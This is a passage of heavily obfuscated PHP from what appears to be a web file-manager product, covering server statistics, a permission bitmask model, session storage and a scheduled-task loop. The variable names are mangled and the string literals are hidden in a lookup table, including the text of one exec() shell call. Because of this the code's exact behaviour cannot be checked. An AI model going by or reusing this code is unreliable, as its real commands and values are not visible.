array($½óÀÍÇõ[1182], $çæ¬ĞÑ£)); if ($šõ¥šäƒ) { $úù¦È—[$½óÀÍÇõ[33]] = array($½óÀÍÇõ[7], $ÎÊæÀÍæ[$šõ¥šäƒ]); } $ì¦ü¼²ñ = Model($½óÀÍÇõ[2130])->where($úù¦È—)->count($ËØ˜Ñ²Â); return (int) $ì¦ü¼²ñ; } private function optionServer() { $”™ŠòÅÏ =& $_SERVER[©—Ò»ÅĞ]; $ê¶ğÇòø = $this->diskDriver(); $¢ãÇàö• = KodIO::defaultDriver(); $Û×Õó€— = array($”™ŠòÅÏ[926] => $¢ãÇàö•[$”™ŠòÅÏ[487]]); $ÍŞöµáö = Model($”™ŠòÅÏ[560])->where($Û×Õó€—)->sum($”™ŠòÅÏ[79]); $‚ãòÎØ  = explode($”™ŠòÅÏ[53], $_SERVER[$”™ŠòÅÏ[144]]); $À˜»¯ª = $‚ãòÎØ [0]; $ÉŠììÇ‘ = $GLOBALS[$”™ŠòÅÏ[6]][$”™ŠòÅÏ[21]]; $ÌØ¯‘¾’ = $ÉŠììÇ‘[$”™ŠòÅÏ[1144]]; if ($ÌØ¯‘¾’ == $”™ŠòÅÏ[1132]) { $¥×¥şÀ = explode($”™ŠòÅÏ[1473], $ÉŠììÇ‘[$”™ŠòÅÏ[1143]]); $ÌØ¯‘¾’ = $¥×¥şÀ[0]; } if ($ÌØ¯‘¾’ == $”™ŠòÅÏ[1077] || $ÌØ¯‘¾’ == $”™ŠòÅÏ[901]) { $†¸¸ÇôŸ = Model()->db()->query($”™ŠòÅÏ[2166]); $„¹ı¤…Ö = $†¸¸ÇôŸ[0] && isset($†¸¸ÇôŸ[0][$”™ŠòÅÏ[1864]]) ? $†¸¸ÇôŸ[0][$”™ŠòÅÏ[1864]] : 0; $ÌØ¯‘¾’ = $”™ŠòÅÏ[2167] . ($„¹ı¤…Ö ? $”™ŠòÅÏ[8] . $„¹ı¤…Ö : $”™ŠòÅÏ[12]); } $æá¡Òâ = $GLOBALS[$”™ŠòÅÏ[6]][$”™ŠòÅÏ[424]][$”™ŠòÅÏ[980]]; return array($”™ŠòÅÏ[2168] => $ê¶ğÇòø ? $ê¶ğÇòø[$”™ŠòÅÏ[2169]] : 0, $”™ŠòÅÏ[2170] => $ê¶ğÇòø ? $ê¶ğÇòø[$”™ŠòÅÏ[2171]] : 0, $”™ŠòÅÏ[2172] => (int) $¢ãÇàö•[$”™ŠòÅÏ[2169]] * 1024 * 1024 * 1024, $”™ŠòÅÏ[2173] => (int) $ÍŞöµáö, $”™ŠòÅÏ[2174] => ucfirst($À˜»¯ª), $”™ŠòÅÏ[2175] => $”™ŠòÅÏ[2176] . PHP_VERSION, $”™ŠòÅÏ[2177] => phpBuild64() ? 64 : 32, $”™ŠòÅÏ[858] => str_replace($”™ŠòÅÏ[1308], $”™ŠòÅÏ[1160], $ÌØ¯‘¾’), $”™ŠòÅÏ[424] => ucfirst($æá¡Òâ), $”™ŠòÅÏ[32] => $_SERVER[$”™ŠòÅÏ[2178]]); } private function diskDriver() { $è·®‡¸ç =& $_SERVER[©—Ò»ÅĞ]; $­”¡‘™³ = $è·®‡¸ç[8]; $ŒÓÇ‰Æ = $GLOBALS[$è·®‡¸ç[6]][$è·®‡¸ç[1497]] == $è·®‡¸ç[1498]; if ($ŒÓÇ‰Æ) { $­”¡‘™³ = $è·®‡¸ç[2179]; if (function_exists($è·®‡¸ç[2180])) { exec($è·®‡¸ç[2181], $¿±Õ¯Š‹); $­”¡‘™³ = $¿±Õ¯Š‹[1] . $è·®‡¸ç[8]; } } if (!file_exists($­”¡‘™³)) { return; } if (!function_exists($è·®‡¸ç[2182])) { return; } $æ¥» óé = @disk_total_space($­”¡‘™³); $îêï¶¹ = $æ¥» óé - @disk_free_space($­”¡‘™³); return array($è·®‡¸ç[2169] => $æ¥» óé, $è·®‡¸ç[2171] => $îêï¶¹); } public function fileChart($š½¸Ò) { $â‡˜ÎÊ¾ =& $_SERVER[©—Ò»ÅĞ]; $åš§î§ = Model($â‡˜ÎÊ¾[933]); if (isset($š½¸Ò[$â‡˜ÎÊ¾[1592]])) { return $åš§î§->userFileTypeProfile($š½¸Ò[$â‡˜ÎÊ¾[1592]]); } if (isset($š½¸Ò[$â‡˜ÎÊ¾[1495]])) { return $åš§î§->groupFileTypeProfile($š½¸Ò[$â‡˜ÎÊ¾[1495]]); } $ı†Ş¶ î = $this->sourceSize(); return array($â‡˜ÎÊ¾[864] => $ı†Ş¶ î[$â‡˜ÎÊ¾[79]], $â‡˜ÎÊ¾[2120] => $ı†Ş¶ î[$â‡˜ÎÊ¾[2120]], $â‡˜ÎÊ¾[2121] => $åš§î§->where(array($â‡˜ÎÊ¾[188] => 1, $â‡˜ÎÊ¾[190] => 0))->sum($â‡˜ÎÊ¾[79]), $â‡˜ÎÊ¾[2122] => $åš§î§->where(array($â‡˜ÎÊ¾[188] => 2, $â‡˜ÎÊ¾[190] => 0))->sum($â‡˜ÎÊ¾[79])); } private function sourceSize() { $ÅŠ°Å“ =& $_SERVER[©—Ò»ÅĞ]; $‡è¡³Ë = Model($ÅŠ°Å“[933])->where(array($ÅŠ°Å“[500] => 0))->sum($ÅŠ°Å“[79]); $Û‘«Õ½ = Model($ÅŠ°Å“[2183])->sum($ÅŠ°Å“[79]); $„ÍÖŒÍ° = Model($ÅŠ°Å“[560])->sum($ÅŠ°Å“[79]); return array($ÅŠ°Å“[79] => (int) $‡è¡³Ë + (int) $Û‘«Õ½, $ÅŠ°Å“[2120] => (int) $„ÍÖŒÍ°); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÕÔêî†­ =& $_SERVER[©—Ò»ÅĞ]; $‚ñ»ô‘… = array(array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2184]), $ÕÔêî†­[2185] => $ÕÔêî†­[2186], $ÕÔêî†­[2187] => 1, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2190]), $ÕÔêî†­[2185] => $ÕÔêî†­[2191], $ÕÔêî†­[2187] => 2, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2192]), $ÕÔêî†­[2185] => $ÕÔêî†­[2193], $ÕÔêî†­[2187] => 3, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2194]), $ÕÔêî†­[2185] => $ÕÔêî†­[2195], $ÕÔêî†­[2187] => 4, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2196]), $ÕÔêî†­[2185] => $ÕÔêî†­[2197], $ÕÔêî†­[2187] => 5, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2198]), $ÕÔêî†­[2185] => $ÕÔêî†­[2199], $ÕÔêî†­[2187] => 6, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÕÔêî†­[509] => LNG($ÕÔêî†­[2200]), $ÕÔêî†­[2185] => $ÕÔêî†­[2201], $ÕÔêî†­[2187] => 7, $ÕÔêî†­[2188] => 1, $ÕÔêî†­[2189] => 0)); return $‚ñ»ô‘…; } public static function authCheck($ôú«ïñû, $ë”æ¢², $†Ãòîä = true) { $ÊŞ°¡ñï =& $_SERVER[©—Ò»ÅĞ]; $ôú«ïñû = intval($ôú«ïñû); if ($†Ãòîä) { if (KodUser::isRoot() && $GLOBALS[$ÊŞ°¡ñï[6]][$ÊŞ°¡ñï[2202]]) { return !0; } } if ($ôú«ïñû <= 0) { return !1; } if (($ôú«ïñû & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ôú«ïñû & $ë”æ¢²); } public static function authCheckShow($ìÓ„õ…–) { return self::authCheck($ìÓ„õ…–, self::AUTH_SHOW); } public static function authCheckView($ãäŒ™ô¤) { return self::authCheck($ãäŒ™ô¤, self::AUTH_VIEW); } public static function authCheckDownload($ğ€ù¼ú) { return self::authCheck($ğ€ù¼ú, self::AUTH_DOWNLOAD); } public static function authCheckUpload($çÔ§¬ë„) { return self::authCheck($çÔ§¬ë„, self::AUTH_UPLOAD); } public static function authCheckEdit($·¼²¹±Á) { return self::authCheck($·¼²¹±Á, self::AUTH_EDIT); } public static function authCheckRemove($õœã¡‹Â) { return self::authCheck($õœã¡‹Â, self::AUTH_REMOVE); } public static function authCheckShare($Šñ‚´™) { return self::authCheck($Šñ‚´™, self::AUTH_SHARE); } public static function authCheckComment($¸šöêœì) { return self::authCheck($¸šöêœì, self::AUTH_COMMENT); } public static function authCheckEvent($å¶”Ââı) { return self::authCheck($å¶”Ââı, self::AUTH_EVENT); } public static function authCheckRoot($Ò¼÷•˜ï) { return self::authCheck($Ò¼÷•˜ï, self::AUTH_ROOT); } public static function authCheckAction($ê£¥¿Û, $Úòë¸Ëê) { $Ú´ø’  =& $_SERVER[©—Ò»ÅĞ]; $çåä—ã = array($Ú´ø’ [1559] => self::AUTH_SHOW, $Ú´ø’ [1560] => self::AUTH_VIEW, $Ú´ø’ [1385] => self::AUTH_DOWNLOAD, $Ú´ø’ [107] => self::AUTH_UPLOAD, $Ú´ø’ [1561] => self::AUTH_EDIT, $Ú´ø’ [1334] => self::AUTH_REMOVE, $Ú´ø’ [1562] => self::AUTH_SHARE, $Ú´ø’ [429] => self::AUTH_COMMENT, $Ú´ø’ [1563] => self::AUTH_EVENT, $Ú´ø’ [1564] => self::AUTH_ROOT); if (!isset($çåä—ã[$Úòë¸Ëê])) { return; } $©åµ¨Ş = $çåä—ã[$Úòë¸Ëê]; $ê£¥¿Û = intval($ê£¥¿Û); if ($ê£¥¿Û <= 0) { return !1; } if (($ê£¥¿Û & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ê£¥¿Û & $©åµ¨Ş); } public static function authDisable($¯ªæ¤Ùª, $Ÿ«¶ùºÎ) { if (intval($¯ªæ¤Ùª) <= 0) { return 0; } return intval($¯ªæ¤Ùª) & ~$Ÿ«¶ùºÎ; } public $optionType = "\x53\171\x73\x74\x65\155\x2e\x73\157\x75\x72\143\145\101\165\164\150\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x61\x75\x74\150", "\x6c\141\142\145\154", "\x64\x69\x73\160\x6c\141\171", "\163\x79\x73\164\145\155", "\163\157\x72\x74"); public function initData() { $ºŸƒ‚šü = $this->authDefault(); foreach ($ºŸƒ‚šü as $²ĞÈéß€) { $this->add($²ĞÈéß€); } } public function findAuth($êä¤ßûÎ, $àËÖÚ£Ã) { $ò¨ö´Û‰ =& $_SERVER[©—Ò»ÅĞ]; $¶Æ¶ÉİÉ = parent::listData(); foreach ($¶Æ¶ÉİÉ as $ó»ëéÊ©) { $“Ç´¯ÏÖ = intval($ó»ëéÊ©[$ò¨ö´Û‰[502]]); if ($“Ç´¯ÏÖ <= 0 || $ó»ëéÊ©[$ò¨ö´Û‰[2203]] == 0) { continue; } if (($“Ç´¯ÏÖ & $êä¤ßûÎ) != $êä¤ßûÎ) { continue; } if (($“Ç´¯ÏÖ & $àËÖÚ£Ã) != 0) { continue; } return $ó»ëéÊ©[$ò¨ö´Û‰[487]]; } return !1; } public function findAuthMax($é€¡ÈÚÁ, $•¡ó³™) { $ÅØ®„î =& $_SERVER[©—Ò»ÅĞ]; $Ù÷€Ô®Ö = !1; $Ìå»óÄÚ = parent::listData(); foreach ($Ìå»óÄÚ as $¿‹“èßé) { $‹œÍ«“ = intval($¿‹“èßé[$ÅØ®„î[502]]); if ($‹œÍ«“ <= 0 || $¿‹“èßé[$ÅØ®„î[2203]] == 0) { continue; } if (($‹œÍ«“ & $é€¡ÈÚÁ) != $é€¡ÈÚÁ) { continue; } if (($‹œÍ«“ & $•¡ó³™) != 0) { continue; } if (!$Ù÷€Ô®Ö) { $Ù÷€Ô®Ö = $¿‹“èßé; continue; } if (intval($Ù÷€Ô®Ö[$ÅØ®„î[502]]) < $‹œÍ«“) { $Ù÷€Ô®Ö = $¿‹“èßé; } } return $Ù÷€Ô®Ö ? $Ù÷€Ô®Ö[$ÅØ®„î[487]] : !1; } public function findAuthReadOnly() { $²è€ÂÆ§ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $“¨‹‘ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($²è€ÂÆ§, $“¨‹‘); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ĞåÕ€šÓ =& $_SERVER[©—Ò»ÅĞ]; $ßÊâüô = parent::listData(); $²©àŸÔ· = !1; foreach ($ßÊâüô as $İåÍèş) { if ($İåÍèş[$ĞåÕ€šÓ[502]] <= 0 || $İåÍèş[$ĞåÕ€šÓ[2203]] == $ĞåÕ€šÓ[228]) { continue; } if (!$²©àŸÔ·) { $²©àŸÔ· = $İåÍèş; continue; } if ($²©àŸÔ·[$ĞåÕ€šÓ[502]] > $İåÍèş[$ĞåÕ€šÓ[502]]) { $²©àŸÔ· = $İåÍèş; } } return $²©àŸÔ· ? $²©àŸÔ·[$ĞåÕ€šÓ[487]] : $ĞåÕ€šÓ[12]; } public function listData($î·œĞŸ¤ = false, $­öÀÉñ« = "\x73\157\x72\x74", $à‹·»Ê÷ = false) { return parent::listData($î·œĞŸ¤, $­öÀÉñ«, $à‹·»Ê÷); } public function update($¹Øóªîš, $ÅÈÓÅ™ù) { $¡ùšĞîä =& $_SERVER[©—Ò»ÅĞ]; $­²Ğöµ‡ = parent::listData($¹Øóªîš); $Ì³Üëœé = $this->findByName($ÅÈÓÅ™ù[$¡ùšĞîä[32]]); if (!$­²Ğöµ‡ || $Ì³Üëœé && $Ì³Üëœé[$¡ùšĞîä[487]] != $­²Ğöµ‡[$¡ùšĞîä[487]]) { return !1; } $this->filterAuth($ÅÈÓÅ™ù[$¡ùšĞîä[502]]); return parent::update($¹Øóªîš, $ÅÈÓÅ™ù); } public function remove($Ëğ£ªÛ‰) { $ºû‘ÒÀ¡ = parent::listData($Ëğ£ªÛ‰); if (!$ºû‘ÒÀ¡ || $ºû‘ÒÀ¡[$_SERVER[©—Ò»ÅĞ][189]]) { return !1; } return parent::remove($Ëğ£ªÛ‰); } public function add($¤èü¨Âã = array()) { $£Ó«ê€î =& $_SERVER[©—Ò»ÅĞ]; if ($this->findByName($¤èü¨Âã[$£Ó«ê€î[32]])) { return !1; } $ºÄªî‚ = array($£Ó«ê€î[32] => $£Ó«ê€î[12], $£Ó«ê€î[502] => 1, $£Ó«ê€î[2204] => $£Ó«ê€î[2193], $£Ó«ê€î[2203] => 1, $£Ó«ê€î[189] => 0, $£Ó«ê€î[2205] => 0); $¤èü¨Âã = array_merge($ºÄªî‚, $¤èü¨Âã); $¤èü¨Âã[$£Ó«ê€î[2205]] = $this->getSort(); $this->filterAuth($¤èü¨Âã[$£Ó«ê€î[502]]); return parent::insert($¤èü¨Âã); } private function getSort() { $äçÑÈû =& $_SERVER[©—Ò»ÅĞ]; $ªãÈšÍ = parent::listData(); $ŞÈäú­Ù = array_to_keyvalue($ªãÈšÍ, $äçÑÈû[12], $äçÑÈû[2205]); return empty($ŞÈäú­Ù) ? 0 : max($ŞÈäú­Ù) + 1; } private function filterAuth(&$”êß—ô›) { if (!$”êß—ô›) { return; } $Áïš‡ˆæ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¸§¥äÍ× = array(); foreach ($Áïš‡ˆæ as $ü­÷úí) { if ($”êß—ô› & $ü­÷úí) { $¸§¥äÍ×[] = $ü­÷úí; } } if (in_array(self::AUTH_ROOT, $¸§¥äÍ×)) { $”êß—ô› = array_sum($Áïš‡ˆæ); return; } $®–Šã‰¤ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¸§¥äÍ× as $ü­÷úí) { if (isset($®–Šã‰¤[$ü­÷úí])) { $¸§¥äÍ× = array_merge($¸§¥äÍ×, $®–Šã‰¤[$ü­÷úí]); } } $¸§¥äÍ×[] = self::AUTH_SHOW; $”êß—ô› = array_sum(array_unique($¸§¥äÍ×)); } public function sort($ƒ²Š œà, $ÃğË±…) { return parent::update($ƒ²Š œà, $ÃğË±…); } } goto fõ”¬Ñ¬‰¬; B¡Ãõ©ì•ê: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¿—ìËÍ =& $_SERVER[©—Ò»ÅĞ]; static $¯›İèò = false; if ($¯›İèò) { return $¯›İèò; } $š¯Òãİš = $GLOBALS[$¿—ìËÍ[6]][$¿—ìËÍ[424]]; self::$sessionTime = $š¯Òãİš[$¿—ìËÍ[1925]]; $õä”Ÿíª = isset($GLOBALS[$¿—ìËÍ[1926]]) ? $GLOBALS[$¿—ìËÍ[1926]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($õä”Ÿíª)) { self::$sessionSign = Cookie::get($õä”Ÿíª); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($õä”Ÿíª, self::$sessionSign, self::$sessionTime); $Şİƒôß = $š¯Òãİš[$¿—ìËÍ[1927]]; $«ÂÆÍÆø = $š¯Òãİš[$Şİƒôß]; $ŠáÆ×íó = $š¯Òãİš[$¿—ìËÍ[981]]; switch ($Şİƒôß) { case $¿—ìËÍ[21]: self::$handle = Model($¿—ìËÍ[982]); break; case $¿—ìËÍ[983]: self::$handle = new CacheRedis($«ÂÆÍÆø, $ŠáÆ×íó); break; case $¿—ìËÍ[984]: self::$handle = new CacheMemcached($«ÂÆÍÆø, $ŠáÆ×íó); break; case $¿—ìËÍ[230]: $«ÂÆÍÆø[$¿—ìËÍ[87]] = $«ÂÆÍÆø[$¿—ìËÍ[87]] . $¿—ìËÍ[1928]; self::$handle = new CacheFile($«ÂÆÍÆø, $ŠáÆ×íó); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$¿—ìËÍ[1662]]) || time() - self::$data[$¿—ìËÍ[1662]] >= 5) { self::dataSave(); } } $¯›İèò = new self(); return $¯›İèò; } public static function getBySign($„è¼ ¨ê) { $†Ü¹ÂÎä = self::$handle->get($„è¼ ¨ê); $†Ü¹ÂÎä = unserialize($†Ü¹ÂÎä); return is_array($†Ü¹ÂÎä) ? $†Ü¹ÂÎä : array(); } public static function setBySign($³öÛ‡äº, $â²‘ÖÑ) { self::$sessionSign = $³öÛ‡äº; self::$data = $â²‘ÖÑ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[©—Ò»ÅĞ][1662]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($¶™Ğ™Ç = false) { if ($¶™Ğ™Ç) { self::$sessionSign = $¶™Ğ™Ç; } self::init(); return self::$sessionSign; } public static function set($ßİŞÜ‰ê, $ğÖÚ—Ô– = false) { self::init(); if (is_array($ßİŞÜ‰ê)) { foreach ($ßİŞÜ‰ê as $Ïñ’Áô´ => $ó¾‹ë„) { array_set_value(self::$data, $Ïñ’Áô´, $ó¾‹ë„); } } else { array_set_value(self::$data, $ßİŞÜ‰ê, $ğÖÚ—Ô–); } self::dataSave(); } public static function get($‹Åò¡ÌÙ = false) { self::init(); if (!$‹Åò¡ÌÙ) { return self::$data; } return array_get_value(self::$data, $‹Åò¡ÌÙ); } public static function remove($ò˜¢ Ç) { self::init(); unset(self::$data[$ò˜¢ Ç]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[©—Ò»ÅĞ][990])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ìË”…û° =& $_SERVER[©—Ò»ÅĞ]; if (self::valueGet($ìË”…û°[850]) != $ìË”…û°[91]) { return; } if (self::valueGet($ìË”…û°[939]) == $ìË”…û°[91]) { $¸õ¦Ü˜’ = self::valueGet($ìË”…û°[1929]); if (time() - $¸õ¦Ü˜’ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ìË”…û°[939], $ìË”…û°[91]); self::log($ìË”…û°[1930] . ACTION . $ìË”…û°[1931]); Hook::bind($ìË”…û°[1932], $ìË”…û°[1933]); $Òü’ëã = 0; while (!0) { self::cacheClear(); if (self::valueGet($ìË”…û°[850]) != $ìË”…û°[91]) { self::valueSet($ìË”…û°[939], $ìË”…û°[228]); self::log($ìË”…û°[1934]); die; } $éĞ‡é = time(); if ($éĞ‡é - $Òü’ëã >= 60) { self::valueSet(array($ìË”…û°[939] => $ìË”…û°[91], $ìË”…û°[1929] => $éĞ‡é)); $Òü’ëã = $éĞ‡é; } if (!file_exists(USER_SYSTEM . $ìË”…û°[1935])) { self::valueSet(array($ìË”…û°[939] => $ìË”…û°[228], $ìË”…û°[850] => $ìË”…û°[228])); self::log($ìË”…û°[1936]); die; } $é€‡ÔÑ° = file_get_contents(BASIC_PATH . $ìË”…û°[1937]); $Óğ»…œû = KOD_VERSION . $ìË”…û°[10] . KOD_VERSION_BUILD; $„®Ô¼²û = match_text($é€‡ÔÑ°, $ìË”…û°[1938]) . $ìË”…û°[10] . match_text($é€‡ÔÑ°, $ìË”…û°[1939]); if ($„®Ô¼²û != $Óğ»…œû) { self::restart(); self::log("\163\164\x6f\160\x65\144\x2e\133\x76\145\162\163\x69\x6f\x6e\x20\x75\x70\144\141\164\x65\73{$versionNow}\40\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¨”Ê‰æı =& $_SERVER[©—Ò»ÅĞ]; http_close(); $GLOBALS[$¨”Ê‰æı[1940]] = 1; $_SERVER[$¨”Ê‰æı[1941]] = $¨”Ê‰æı[1942]; $_COOKIE = array(); $GLOBALS[$¨”Ê‰æı[1943]] = 1; $GLOBALS[$¨”Ê‰æı[1944]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÏÂ•§îÀ =& $_SERVER[©—Ò»ÅĞ]; http_close(); self::valueSet($ÏÂ•§îÀ[850], $ÏÂ•§îÀ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÏÂ•§îÀ[939] => $ÏÂ•§îÀ[228], $ÏÂ•§îÀ[850] => $ÏÂ•§îÀ[91])); self::log($ÏÂ•§îÀ[1945]); } public static function taskSwitch() { $¬¡í‹ÖÏ =& $_SERVER[©—Ò»ÅĞ]; $‰’•äåŞ = self::valueGet($¬¡í‹ÖÏ[850]) == $¬¡í‹ÖÏ[91] ? $¬¡í‹ÖÏ[228] : $¬¡í‹ÖÏ[91]; self::valueSet($¬¡í‹ÖÏ[850], $‰’•äåŞ); } public static function shutdownEvent() { $’µÜ„é¼ =& $_SERVER[©—Ò»ÅĞ]; self::valueSet($’µÜ„é¼[939], $’µÜ„é¼[228]); self::log($’µÜ„é¼[1946]); } public static function config($àä“…Â£, $Å‚ÌÂ¦È) { self::valueSet($_SERVER[©—Ò»ÅĞ][850], $àä“…Â£); } private static function taskRunAll() { $Ğ›…ÈÙŸ =& $_SERVER[©—Ò»ÅĞ]; $«ñ†ÙœÎ = timeFloat(); $ıÄÓû£Š = Model($Ğ›…ÈÙŸ[1947])->listData(); $¶İêäá = count($ıÄÓû£Š); for ($˜ÍØ”£Û = 0; $˜ÍØ”£Û < $¶İêäá; $˜ÍØ”£Û++) { $ÜÒââ±Ê = $ıÄÓû£Š[$˜ÍØ”£Û]; if (!$ÜÒââ±Ê[$Ğ›…ÈÙŸ[487]] || $ÜÒââ±Ê[$Ğ›…ÈÙŸ[1948]] != $Ğ›…ÈÙŸ[91]) { continue; } if (!self::taskTimeCheck($ÜÒââ±Ê)) { continue; } self::taskRun($ÜÒââ±Ê); } Hook::trigger($Ğ›…ÈÙŸ[1949]); self::taskQueueRun($«ñ†ÙœÎ); } private static function taskQueueRun($½ìÓàª£) { $è¥ÍÖ‡“ = 10; while (!0) { $Æ±Ëâç = TaskQueue::run(); if ($Æ±Ëâç === !1) { break; } if (timeFloat() - $½ìÓàª£ >= $è¥ÍÖ‡“) { break; } } } private static function taskTimeCheck($ÍÌ±îÇå) { $ã³¡¤ÆÄ =& $_SERVER[©—Ò»ÅĞ]; $ØĞèéäÛ = json_decode($ÍÌ±îÇå[$ã³¡¤ÆÄ[204]], !0); $ÑÍ¯îì… = intval($ÍÌ±îÇå[$ã³¡¤ÆÄ[1929]]); $ÀİõÍÚ‘ = strtotime($ã³¡¤ÆÄ[1950] . $ØĞèéäÛ[$ã³¡¤ÆÄ[1951]] . $ã³¡¤ÆÄ[1952]) - strtotime($ã³¡¤ÆÄ[1953]); $«åü„ÅÒ = time() - strtotime(date($ã³¡¤ÆÄ[1954]) . $ã³¡¤ÆÄ[1955]); $¿ÌƒÓÌğ = $«åü„ÅÒ >= $ÀİõÍÚ‘ && $«åü„ÅÒ <= $ÀİõÍÚ‘ + 3600; switch ($ØĞèéäÛ[$ã³¡¤ÆÄ[33]]) { case $ã³¡¤ÆÄ[1956]: if (time() - $ÑÍ¯îì… < 3600 * 24 * 30) { return !1; } if ($ØĞèéäÛ[$ã³¡¤ÆÄ[1956]] == date($ã³¡¤ÆÄ[1957]) && $¿ÌƒÓÌğ) { return !0; } break; case $ã³¡¤ÆÄ[1958]: if (time() - $ÑÍ¯îì… < 3600 * 24 * 7) { return !1; } $×·Ÿı’ = date($ã³¡¤ÆÄ[1959]) == 0 ? 7 : date($ã³¡¤ÆÄ[1959]); if ($ØĞèéäÛ[$ã³¡¤ÆÄ[1958]] == $×·Ÿı’ && $¿ÌƒÓÌğ) { return !0; } break; case $ã³¡¤ÆÄ[1951]: if (time() - $ÑÍ¯îì… < 3600 * 24) { return !1; } if ($¿ÌƒÓÌğ) { return !0; } break; case $ã³¡¤ÆÄ[1960]: if (time() - $ÑÍ¯îì… >= floatval($ØĞèéäÛ[$ã³¡¤ÆÄ[1960]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $áÓĞÒÍ =& $_SERVER[©—Ò»ÅĞ]; static $É°´•ò = 0; $÷ˆÖÅğı = 300; if (!$É°´•ò) { $É°´•ò = time(); } if (time() - $É°´•ò < $÷ˆÖÅğı) { return; } $É°´•ò = time(); $Æ‹æƒ²„ = Model($áÓĞÒÍ[597])->db($áÓĞÒÍ[12]); if ($Æ‹æƒ²„) { $Æ‹æƒ²„->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($áÓĞÒÍ[1961], $áÓĞÒÍ[1962]); die; } } public static function taskRun($òÃÎÛœ) { $Üëíè´¼ =& $_SERVER[©—Ò»ÅĞ]; self::log($Üëíè´¼[1963] . $òÃÎÛœ[$Üëíè´¼[487]] . $Üëíè´¼[1964] . $òÃÎÛœ[$Üëíè´¼[32]] . $Üëíè´¼[1965] . $òÃÎÛœ[$Üëíè´¼[1563]]); Model($Üëíè´¼[1947])->run($òÃÎÛœ[$Üëíè´¼[487]]); $ãÜáÎ´Ã = timeFloat(); $³Ê‰ÖÙ = $Üëíè´¼[12]; switch ($òÃÎÛœ[$Üëíè´¼[33]]) { case $Üëíè´¼[382]: $¯Ğ¯Œ—É = url_request($òÃÎÛœ[$Üëíè´¼[1563]], $Üëíè´¼[1605], !1, !1, !1, !1, 10); if ($¯Ğ¯Œ—É[$Üëíè´¼[850]]) { $³Ê‰ÖÙ = strlen($¯Ğ¯Œ—É[$Üëíè´¼[1392]]); } break; case 